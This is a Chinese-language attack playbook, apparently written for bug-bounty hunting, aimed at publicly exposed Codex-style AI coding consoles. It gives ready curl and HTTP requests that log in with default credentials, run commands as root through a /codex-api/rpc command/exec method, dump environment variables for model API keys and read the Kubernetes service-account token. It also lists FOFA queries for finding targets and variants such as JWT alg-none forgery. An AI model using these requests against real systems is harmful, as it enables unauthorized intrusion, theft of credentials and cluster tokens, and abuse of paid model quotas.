# 云 IDE / Codex 系 AI 编程平台：弱口令→Root RCE→凭证链

> 类型：认证缺陷 + 危险 RPC + 容器/集群凭证链  
> 写不写只认 `vuln-report-format.md`。短表指针用标题搜。

---

## Codex 系编程台 RPC（短表有指针）

认：公网编程台有 `/tenant-api/login` + `/codex-api/rpc`（或同类租户登录 + Codex RPC）。不是对话口 bash 工具（那枪见 `agent-tool-exec-test.md`），也不是 VS Code 无登录墙读 environ（那枪见 `path-traversal-lfi-test.md`）。

打：当前站。裸默认口拿会话，再 `command/exec` / `fs/*` / `env`。无 Cookie 也试 `meta/methods`。认到只打当前站，禁止开新种子 FOFA。

算成：root 且 hostname 像持久计算面 Pod，并能读出集群 SA 或模型 Key。

假点：通配符证书临时实例随时销毁；只登录没有 RPC；模型只口头说执行了。半条链（只登录）继续挖 RPC，不进短表当打穿。

---

## 1. 模式画像（看到就测）

| 特征 | 示例 |
|------|------|
| 域名/产品 | AI 编程助手、playbook、Codex 系控制台（不钉某一家） |
| 路径 | `/tenant-api/login`、`/codex-api/rpc`、`/tenant-api/*` |
| 框架痕迹 | OpenAI Codex、`@openai/codex`、thread/model RPC |
| 环境 | dev / pre / fat / gray / sandbox（**公网暴露的 DEV 优先扫**，再找生产同构） |
| 默认账密 | 这形态控制台的裸默认口（`admin/admin` 一类），**不是**每站登录框字典 |

**一句话链路：**

```
弱口令/未授权登录 → 租户会话(JWT/Cookie)
  → POST /codex-api/rpc method=command/exec（root）
  → env / fs 读集群 SA + 模型 API Key + 邀请码
  → 额度消耗 / 潜在横向 / 持久化
```

---

## 2. 最小探测矩阵（每个候选 Host）

### 2.1 指纹

```bash
# 登录面
curl -sk -o /dev/null -w "%{http_code}" -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'

# RPC 面（无 Cookie 时也要看错误形态：401 vs method not found vs 直通）
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -d '{"method":"meta/methods","params":{}}'
```

存活信号：
- 登录返回 JSON（userId / session / 密码错误）而非整站 405 HTML
- RPC 返回 JSON-RPC 形态 / methods 列表 / 未登录明确错误
- 前端标题含 codex / playbook / 编程台

### 2.2 弱口令（登录）

只打**当前站**这形态控制台的裸默认口（`dig-scope` §4.1.1：登录表单字典不当必做）。一眼：

```bash
curl -sk -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' -D -
```

常见：`admin/admin`、`admin/123456`；有 `TENANT_ADMIN_USERNAMES` / 邀请码再当钥匙。没有入口或证伪就停，不磨验证码。

成功：`Set-Cookie: tenant_session=...` 或 body 含 `userId` + 身份 admin。

### 2.3 RCE / 文件 / 元方法（登录后）

```bash
# 方法枚举
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"meta/methods","params":{}}'

# 命令执行（最小证明：id / whoami / hostname）
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"command/exec","params":{"command":["id"]}}'

# 目录 / 读文件
-d '{"method":"fs/readDirectory","params":{"path":"/"}}'
-d '{"method":"fs/readFile","params":{"path":"/etc/os-release"}}'

# 环境变量（密钥）
-d '{"method":"command/exec","params":{"command":["env"]}}'

# 集群 SA（若容器在集群内）
-d '{"method":"command/exec","params":{"command":["cat","/var/run/secrets/kubernetes.io/serviceaccount/token"]}}'
```

**危险方法清单（命中即高价值）：**

| method | 含义 |
|--------|------|
| `command/exec` | 任意命令 |
| `fs/readFile` / `fs/writeFile` / `fs/remove` / `fs/readDirectory` | 文件系统 |
| `meta/methods` | 能力面枚举 |
| `thread/start` / `model/list` | AI 会话与模型（耗 Key） |
| git 相关 RPC | 代码仓读写 |

---

## 3. 危害证明怎么写才硬（SRC）

优先证据顺序：

1. **Root RCE**：`id` → `uid=0(root)`（最小、可复核）
2. **环境与持久服务**：hostname 像计算面 Pod 名 ≠ 随机临时沙箱文案
3. **密钥**：模型 `*_API_KEY`（报告可打码中间段）
4. **集群**：`KUBERNETES_SERVICE_HOST` + SA token 可读
5. **邀请码 / 管理员用户名**：可注册持久账号
6. **RPC 面宽度**：80+ methods 截一段危险列表即可

**边界写清：**
- 是否公网未授权 / 仅弱口令
- 是否 root、是否集群内
- Key 是否可用于外部模型额度消耗
- DEV vs 生产：若只有 DEV，正文标明环境；能找到 **prod 同构** 一并打更稳

**假点再钉一次：** 通配符证书临时实例随时销毁 → 不算打穿。持久计算面 + 凭证链才往下写。半条（只登录无 RPC）继续挖，不按打穿进表。

---

## 4. 资产怎么找

**只打当前站。** 认到 `/tenant-api/login`、`/codex-api/rpc` 就在本 host 打 §2，禁止认到就新开种子、FOFA 全网同皮（hunt-iter 开场；`dig-scope` 一种子闭环）。优质根域只回灌，本种子剩余活面挖完才搜。

下面语句**仅当本任务本种子已经是 Codex / 编程台这条**时，用来翻本种子结果，不是认到同框架就另开工厂：

```
body="/codex-api/rpc" || body="/tenant-api/login"
body="codex-api" && body="tenant"
body="@openai/codex" || body="command/exec"
```

当前站 JS 里的 `tenant-api`、`codex-api`、RPC method、邀请码，跟本站清单，不拿去开新种子。

---

## 5. 同构变体（不要只会 admin/admin）

1. **零认证 RPC**：无 Cookie 直接 `command/exec` / `meta/methods`
2. **注册接口 + 固定邀请码**：env 或前端硬编码 `TENANT_INVITE_CODE`
3. **JWT 弱密钥 / 算法 none**：`tenant_session` 伪造 admin
4. **WebSocket / 另一网关**：同源 Codex 走 WS 推命令
5. **同种子 sibling**：去 `-dev` / 生产 host 只做一眼差分（新 path / 回码变了才升级）。禁止为此开新种子 FOFA
6. **多租户隔离**：普通用户 session 是否也能 `command/exec`（垂直越权 RCE）

---

## 6. 操作纪律

- 命令执行只做 **id / hostname / 只读 cat 指定路径**；禁止破坏性写、挖矿、扫内网爆破
- 密钥写入报告时注意脱敏策略（平台要求完整则贴完整，否则中间打码 + 说明长度）
- 别停在能传能下；本链价值在 **RCE + 密钥 + 集群**
- 半条链（只登录无 RCE）继续挖 RPC

---

## 7. 对照骨架（无实站）

| 项 | 值 |
|----|-----|
| 登录 | `POST /tenant-api/login` 裸默认口 → `tenant_session` |
| RCE | `POST /codex-api/rpc` `command/exec` → root |
| 环境 | 计算面 Pod；集群 API 内网 |
| 链上资产 | 模型 Key、SA token、邀请码、宽 RPC |
| 写不写 | 只认 `vuln-report-format.md`。DEV 是否收录看 SRC 口径；有 prod 同构更稳 |

复现骨架（HOST / SESSION 换成当前站实值）：

```http
POST /tenant-api/login HTTP/1.1
Host: HOST
Content-Type: application/json

{"username":"admin","password":"admin"}
```

```http
POST /codex-api/rpc HTTP/1.1
Host: HOST
Content-Type: application/json
Cookie: tenant_session=SESSION

{"method":"command/exec","params":{"command":["id"]}}
```

---

## 8. 一句话

**公网 Codex 系编程台：当前站先打 `/tenant-api/login` 裸默认口与注册码，再打 `/codex-api/rpc` 的 `command/exec`+`fs/*`+`env`，用 root+集群+API Key 闭环。认到只打当前站，优先持久化生产面。**
